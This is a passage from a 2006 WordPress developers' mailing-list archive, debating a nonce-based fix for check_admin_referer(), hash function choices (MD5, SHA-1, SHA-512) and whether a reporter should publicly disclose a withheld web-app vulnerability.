References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
Message-ID: <44494CC4.7040606@midnightcircus.com>

Paul Mitchell wrote:
> Sorry, I'm getting confused. I was thinking of DB_PASSWORD. I can't find
> a definition for DB_PASS anywhere in trunk.

Touch?.

Still, it doesn't make your point about using the database password to 
generate a hash any more valid.

Owen

From denis at semiologic.com  Fri Apr 21 21:20:26 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Fri Apr 21 21:24:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44494CC4.7040606@midnightcircus.com>
Message-ID: <000001c66589$6a3793f0$2f01a8c0@kergan>

pardon for asking, but what's the point in storing this into the db or a
cookie. doesn't it belong in a session variable?

D.

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Owen Winkler
> Sent: Friday, April 21, 2006 2:21 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Rethinking check_admin_referer()
> 
> 
> Paul Mitchell wrote:
> > Sorry, I'm getting confused. I was thinking of DB_PASSWORD. I can't 
> > find a definition for DB_PASS anywhere in trunk.
> 
> Touch?.
> 
> Still, it doesn't make your point about using the database 
> password to 
> generate a hash any more valid.
> 
> Owen
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com 
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From Brian at TheCodeCave.com  Fri Apr 21 21:22:02 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 21:26:08 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <44494879.5010806@boren.nu>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98082@dsimail.drbsystems.com>

>Myself and Matt are on point and a few others on the contributing devs 
>list get the emails too.  We wade through all of the cranks and posers
>and forward the stuff needing attention to other regular contributors.

Thank you Ryan.

From denis at semiologic.com  Fri Apr 21 21:23:11 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Fri Apr 21 21:27:46 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000001c66589$6a3793f0$2f01a8c0@kergan>
Message-ID: <000101c66589$cd4369b0$2f01a8c0@kergan>

woops... this belongs somewhere else in the thread, but those who followed
it probably knew instantly. for the others, I meant storing unique tokens
and the like, which was discussed earlier for so-called nonces, hashes, etc.

> pardon for asking, but what's the point in storing this into 
> the db or a cookie. doesn't it belong in a session variable?

D.

From ringmaster at midnightcircus.com  Fri Apr 21 21:32:40 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 21 21:32:24 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000101c66589$cd4369b0$2f01a8c0@kergan>
References: <000101c66589$cd4369b0$2f01a8c0@kergan>
Message-ID: <44494F78.2060703@midnightcircus.com>

Denis de Bernardy wrote:
> woops... this belongs somewhere else in the thread, but those who followed
> it probably knew instantly. for the others, I meant storing unique tokens
> and the like, which was discussed earlier for so-called nonces, hashes, etc.

Yeah, I was wondering what you were going on about.  :)

>> pardon for asking, but what's the point in storing this into 
>> the db or a cookie. doesn't it belong in a session variable?

The patch I submitted uses none of those.  And it seems to work just 
fine in spite of a few changes that need to be made.

Owen

From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 21:28:00 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 21:33:00 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44494CC4.7040606@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<ebe43d680604200403q31482387ic05c5ad2e8491e13@mail.gmail.com>	<aa74b1910604200726vf77cab3t7ac20df0d45bfbe9@mail.gmail.com>	<Pine.LNX.4.61.0604201307230.5718@tribal.metalab.unc.edu>	<aa74b1910604202018s577dad2dt6b87c5cd6cb0ca73@mail.gmail.com>	<Pine.LNX.4.61.0604202322370.6701@tribal.metalab.unc.edu>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
Message-ID: <44494E60.3080403@paul-mitchell.me.uk>

Owen Winkler wrote:
> Paul Mitchell wrote:
>> Sorry, I'm getting confused. I was thinking of DB_PASSWORD. I can't find
>> a definition for DB_PASS anywhere in trunk.
>
> Touch?.
>
> Still, it doesn't make your point about using the database password to
> generate a hash any more valid.
I beg your pardon? I said I would think twice about doing it. I wasn't
making a point other than to state my own opinion of something you asked
interested parties to review.

Paul

From false.hopes at gmail.com  Fri Apr 21 21:35:13 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 21:39:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44494E60.3080403@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>
	<44486843.5060304@mullenweg.com>
	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>
	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
Message-ID: <a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>

On 4/21/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
> Owen Winkler wrote:
> > Still, it doesn't make your point about using the database password to
> > generate a hash any more valid.
> I beg your pardon? I said I would think twice about doing it. I wasn't
> making a point other than to state my own opinion of something you asked
> interested parties to review.

You might want to think twice about it, but that's only because you
don't understand what a hash is.Before you continue to make a fool of
yourself, here's some information on the nice md5() function you see
wrapped around that information.

http://en.wikipedia.org/wiki/MD5
http://en.wikipedia.org/wiki/Cryptographic_hash_function

Props to Owen for a bit of that mail.

--
--Robert Deaton
http://somethingunpredictable.com
From wp-hackers at paul-mitchell.me.uk  Fri Apr 21 21:46:06 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Fri Apr 21 21:51:06 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>	<44486843.5060304@mullenweg.com>	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>	<44494901.2020008@paul-mitchell.me.uk>	<44494CC4.7040606@midnightcircus.com>	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
Message-ID: <4449529E.2040002@paul-mitchell.me.uk>

Robert Deaton wrote:
> You might want to think twice about it, but that's only because you
> don't understand what a hash is.Before you continue to make a fool of
> yourself, here's some information on the nice md5() function you see
> wrapped around that information.
>   
I don't feel particularly foolish, Robert. I'm not a security expert and
I'm always willing to learn.

I'm happy to educate myself as to the operation of MD5, if you think
that will help. Is there something particular about MD5 as opposed to
other hashing functions that makes it worthy of attention?

Paul

From Brian at TheCodeCave.com  Fri Apr 21 21:49:36 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 21:53:44 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <512061b90604211400t26867cb6t2eee6e1d3abe812e@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>

> I'm not sure what you mean by this but if you would withhold
> information, I think that would be somewhat antiproductive, wouldn't
> it?

Yes, and that will be the point of my not going into a lot of detail.

I am very disturbed by what I've found and there are repercussions far
beyond WP.

I can say that openly because I'll be assumed to be a crank and braggart.

The nonce solution that Owen proposed will adequately protect WP from my
approach.  Therefore I don't have to give a "how-to tutorial" of an exploit
that could be adapted to attack any non-compiled, non-nonced, non-customized
web application out there.

With the problem already solved, I need only provide an example url that can
be used to demonstrates the current vulnerability and prove that updated
blogs are protected.

Sorry if that bothers anyone, but I'm not budging on this one.  I'll likely
disclose more to Matt as I at least have read his blog for that last couple
years a know at least a little about his presented character.  Then he can
judge beyond that.  No offense, but the rest of you are just names at this
point. :)  
_______________________________________________
Brian Layman
www.TheCodeCave.com
 

From dstewart at atl.lmco.com  Fri Apr 21 21:51:57 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Apr 21 21:56:03 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4449529E.2040002@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<a491f91d0604202042j7c595768g1d7484cc868e821@mail.gmail.com>
	<44486843.5060304@mullenweg.com>
	<a491f91d0604210859r79eb5ecekd2c1f0617b58c1ad@mail.gmail.com>
	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk>
Message-ID: <444953FD.5060302@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Paul Mitchell wrote:
> Robert Deaton wrote:
> 
>>You might want to think twice about it, but that's only because you
>>don't understand what a hash is.Before you continue to make a fool of
>>yourself, here's some information on the nice md5() function you see
>>wrapped around that information.
>>  
> 
> I don't feel particularly foolish, Robert. I'm not a security expert and
> I'm always willing to learn.
> 
> I'm happy to educate myself as to the operation of MD5, if you think
> that will help. Is there something particular about MD5 as opposed to
> other hashing functions that makes it worthy of attention?
> 

It's quick and Relatively Good Enough for operations (like in this case)
whose timeframe for expiration are far shorter than the time it would
take to crack the hash itself.  Although, the Wikipedia article Robert
linked to does point out a lot of the shortcomings with MD5.  Why don't
we use sha1() instead?

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFESVP9N50Q8DVvcvkRAiq4AJ9lg1Mnp9zSLQicX0fd/8tsAHDKSQCeLGEl
P50auEWV5Ix0gVtASX4/DUI=
=Aw1c
-----END PGP SIGNATURE-----
From Brian at TheCodeCave.com  Fri Apr 21 21:57:23 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 22:01:30 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44490419.80507@midnightcircus.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98084@dsimail.drbsystems.com>

Owen boasted:
>Interested parties should review this ticket:
>http://trac.wordpress.org/ticket/2678
>Owen

This is a very good solution Owen.  

It has several very good things going for it:
1. The nonce is generated with information that never reaches the client
side (Use of the PW was clever Owen, my per user daily random number was
overkill.)
2. The nonce is time dependant.  Therefore, there is only a small window for
it to be stolen and used.
3. Equally importantly, the nonce is action specific.  Therefore, any
vulnerability can only be exploited when the admin user has just done that
action once.

Everything I was trying to achieve in the outline here:
http://comox.textdrive.com/pipermail/wp-hackers/2006-April/005797.html

I'll reread the whole patch later tonight, but it looks like you've hit the
mark pretty squarely.

I know nothing of the trac system you all use or where to get the nightly
builds. If frankly never wanted to know before.

Is there a place where I can grab the code with those changes in it?
Frankly that diff file was a royal pain to read.
Is there software that I should have that generates/reads those?  Could you
give me a quick rundown on that or point me to a link that describes that
whole side of the WP world?

From Brian at TheCodeCave.com  Fri Apr 21 22:06:41 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 22:10:48 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98084@dsimail.drbsystems.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98085@dsimail.drbsystems.com>


Brian bumbled around saying:
>This is a very good solution Owen.  
>It has several very good things going for it
>If frankly never wanted to know before.
>Frankly that diff file was a royal pain to read.


Sorry 'bout that post.

It's been a long day and I am trying to re-use my words as much as possible.


You see, my vocabulary is running low...

;)

From false.hopes at gmail.com  Fri Apr 21 22:11:14 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 22:15:17 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444953FD.5060302@atl.lmco.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk> <444953FD.5060302@atl.lmco.com>
Message-ID: <a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>

On 4/21/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
> It's quick and Relatively Good Enough for operations (like in this case)
> whose timeframe for expiration are far shorter than the time it would
> take to crack the hash itself.  Although, the Wikipedia article Robert
> linked to does point out a lot of the shortcomings with MD5.  Why don't
> we use sha1() instead?

php.net/sha1

sha1() is >=4.3.0 only, compat functions would be incredibly slow.

Besides that, the shortcomings of md5 are tiny and irrelevant in this
case, where all we need is a hash. Even though collisions can be
generated relatively quickly for MD5 now, we don't have to worry,
because even if someone somehow found one of our nonces, a collision
for that nonce is useless toward cracking anything, because our hash
is munged with a 5 digit integer, the database password, and the
user_id of the person the hash is for. There is currently (and
probably never will be) a way to isolate a tiny bit of the source
string even if the time and the user id were known, or to generate a
collision on only part of the source string, so the issues are
unfounded (but is a valid point for switching our passwords to sha1,
however this is a different thread).



--
--Robert Deaton
http://somethingunpredictable.com
From dstewart at atl.lmco.com  Fri Apr 21 22:12:56 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Apr 21 22:17:00 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk>
	<444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
Message-ID: <444958E8.6080806@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Robert Deaton wrote:
> (but is a valid point for switching our passwords to sha1,
> however this is a different thread).
> 

Hooray for cross-thread collateral damage!

*grin*

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFESVjoN50Q8DVvcvkRAhh/AJ9KVu2wLMZzFIcaRmbyYjyNbHZcyQCdHgqO
nYK6XyY4EuO5EfWfwhg2riY=
=7Raf
-----END PGP SIGNATURE-----
From elharo at metalab.unc.edu  Fri Apr 21 22:15:00 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Fri Apr 21 22:19:34 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
Message-ID: <44495964.6080604@metalab.unc.edu>

Brian Layman wrote:

> The nonce solution that Owen proposed will adequately protect WP from my
> approach.  Therefore I don't have to give a "how-to tutorial" of an exploit
> that could be adapted to attack any non-compiled, non-nonced, non-customized
> web application out there.
> 

If it's really that bad, I'd suggest you publish it because no one 
person is going to be able to fix all the web apps out there.

However, I suspect what you've discovered is the well-known problem 
where GET is used for operations with side effects, a common flaw in web 
apps designed by people who don't understand HTTP. While not as widely 
known as it should be (which is why further publicity would be a good 
thing) it's hardly a new attack. It's certainly known to 
web-app-attackers everywhere. Being quiet about it only helps the black 
hats who already know.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Fri Apr 21 22:17:30 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Fri Apr 21 22:22:02 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>	<44494901.2020008@paul-mitchell.me.uk>	<44494CC4.7040606@midnightcircus.com>	<44494E60.3080403@paul-mitchell.me.uk>	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>	<4449529E.2040002@paul-mitchell.me.uk>
	<444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
Message-ID: <444959FA.5010600@metalab.unc.edu>

> On 4/21/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
>> It's quick and Relatively Good Enough for operations (like in this case)
>> whose timeframe for expiration are far shorter than the time it would
>> take to crack the hash itself.  Although, the Wikipedia article Robert
>> linked to does point out a lot of the shortcomings with MD5.  Why don't
>> we use sha1() instead?
> 

SHA-1 has recently begun to show weaknesses. For now they're probably 
not relevant for this use case, but attacks only get better with time. 
They never get worse. SHA-256, SHA-512, or Whirlpool might be better 
choices.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From dstewart at atl.lmco.com  Fri Apr 21 22:21:10 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Apr 21 22:25:30 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444959FA.5010600@metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44490419.80507@midnightcircus.com>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk>
	<444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
	<444959FA.5010600@metalab.unc.edu>
Message-ID: <44495AD6.7040905@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Elliotte Harold wrote:
> 
> SHA-1 has recently begun to show weaknesses. For now they're probably
> not relevant for this use case, but attacks only get better with time.
> They never get worse. SHA-256, SHA-512, or Whirlpool might be better
> choices.
> 

Agreed, but last I checked, none of those had native PHP implementations.

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFESVrWN50Q8DVvcvkRAi3nAJ9XYrYpq5v2foZXbhj47GKDienAOACfWIbL
HOxirGqThVMjr/Kvdu+sRog=
=uzHh
-----END PGP SIGNATURE-----
From Brian at TheCodeCave.com  Fri Apr 21 22:22:07 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri Apr 21 22:26:16 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98086@dsimail.drbsystems.com>

Robert Deaton wrote:
>Even though collisions can be generated relatively quickly for MD5 now, 
>we don't have to worry,
Too true.  

Yes, you can tunnel through an md5 in 17 seconds and a commercial pc
machine.

But for most blogs, we'd be lucky to consistently have the webpage fully
refresh in just 17 seconds.

:)

From ringmaster at midnightcircus.com  Fri Apr 21 22:25:40 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr 21 22:28:44 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <444958E8.6080806@atl.lmco.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<44490419.80507@midnightcircus.com>	<4449102E.20007@paul-mitchell.me.uk>	<444913C1.7060507@midnightcircus.com>	<44494901.2020008@paul-mitchell.me.uk>	<44494CC4.7040606@midnightcircus.com>	<44494E60.3080403@paul-mitchell.me.uk>	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>	<4449529E.2040002@paul-mitchell.me.uk>	<444953FD.5060302@atl.lmco.com>	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
	<444958E8.6080806@atl.lmco.com>
Message-ID: <44495BE4.9050501@midnightcircus.com>

Doug Stewart wrote:
> Robert Deaton wrote:
>> (but is a valid point for switching our passwords to sha1,
>> however this is a different thread).
>>
> 
> Hooray for cross-thread collateral damage!

/me bludgeons himself to death with the cryptographic hash tutorial he 
had prepared for this thread before Robert said it succinctly, and then 
takes shelter from the impending explosion of doom from the md5 to sha1 
conversion of passwords.

Owen


From false.hopes at gmail.com  Fri Apr 21 22:30:58 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr 21 22:35:02 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44495BE4.9050501@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk> <444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
	<444958E8.6080806@atl.lmco.com> <44495BE4.9050501@midnightcircus.com>
Message-ID: <a491f91d0604211530x7a16ff61w1cb8bd5214eff9c0@mail.gmail.com>

On 4/21/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> /me bludgeons himself to death with the cryptographic hash tutorial he
> had prepared for this thread before Robert said it succinctly, and then
> takes shelter from the impending explosion of doom from the md5 to sha1
> conversion of passwords.

Pfft, if we're going to move hashing algorithms, let's get something
with longevity. sha512 all the way.

By the way, Doug: hash('sha512', 'password'); <-- sha512 native to PHP
(but 5.1.2 only)

--
--Robert Deaton
http://somethingunpredictable.com
From dstewart at atl.lmco.com  Fri Apr 21 22:33:51 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Fri Apr 21 22:38:05 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211530x7a16ff61w1cb8bd5214eff9c0@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk>
	<444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
	<444958E8.6080806@atl.lmco.com>
	<44495BE4.9050501@midnightcircus.com>
	<a491f91d0604211530x7a16ff61w1cb8bd5214eff9c0@mail.gmail.com>
Message-ID: <44495DCF.8010403@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Robert Deaton wrote:
 > By the way, Doug: hash('sha512', 'password'); <-- sha512 native to PHP
> (but 5.1.2 only)

Forcing people to move to php5 - THAT'LL win us fans.  *grin*

Maybe php6 and the nuking of safe mode will finally force hosts to move
off 4.3.x... And maybe I'm a Chinese jet pilot.

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFESV3PN50Q8DVvcvkRArKuAJ9I1685S+FLFxA9VvY7As3gGEMpfQCfU15g
01xsadILF6tw7HEEA+p+q5o=
=2H6o
-----END PGP SIGNATURE-----
From stewart at ugelow.com  Fri Apr 21 22:34:39 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Fri Apr 21 22:38:43 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<4449102E.20007@paul-mitchell.me.uk>
	<444913C1.7060507@midnightcircus.com>
	<44494901.2020008@paul-mitchell.me.uk>
	<44494CC4.7040606@midnightcircus.com>
	<44494E60.3080403@paul-mitchell.me.uk>
	<a491f91d0604211435y2705cca8p5c1f3217294aa42d@mail.gmail.com>
	<4449529E.2040002@paul-mitchell.me.uk> <444953FD.5060302@atl.lmco.com>
	<a491f91d0604211511o136f4822i5c2dd203f0392d6d@mail.gmail.com>
Message-ID: <7c94a5850604211534u5e7283b0r40726b0b824fe74c@mail.gmail.com>

On 4/21/06, Robert Deaton <false.hopes@gmail.com> wrote:

> sha1() is >=4.3.0 only, compat functions would be incredibly slow.

Seeing as how the last version of 4.2.x was released in September
2002, I'm thinking you've got bigger security problems than MD5
weaknesses if you're still running a version < 4.3. :)

--Stewart

--

Stewart Ugelow
www.ugelow.com
From ryan at ryanduff.net  Fri Apr 21 22:39:25 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Fri Apr 21 22:43:44 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <44495964.6080604@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
Message-ID: <44495F1D.7000000@ryanduff.net>

Elliotte Harold wrote:
> Brian Layman wrote:
> 
>> The nonce solution that Owen proposed will adequately protect WP from my
>> approach.  Therefore I don't have to give a "how-to tutorial" of an 
>> exploit
>> that could be adapted to attack any non-compiled, non-nonced, 
>> non-customized
>> web application out there.
>>
> 
> If it's really that bad, I'd suggest you publish it because no one 
> person is going to be able to fix all the web apps out there.
> 
> However, I suspect what you've discovered is the well-known problem 
> where GET is used for operations with side effects, a common flaw in web 
> apps designed by people who don't understand HTTP. While not as widely 
> known as it should be (which is why further publicity would be a good 
> thing) it's hardly a new attack. It's certainly known to 
> web-app-attackers everywhere. Being quiet about it only helps the black 
> hats who already know.
> 

Nobody here is trying to fix all the web apps. Just one. Seriously, are 
you done hyping whatever was found?

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From denis at semiologic.com  Fri Apr 21 22:52:53 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Fri Apr 21 22:57:03 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4449529E.2040002@paul-mitchell.me.uk>
Message-ID: <000601c66596$541d3d60$2f01a8c0@kergan>

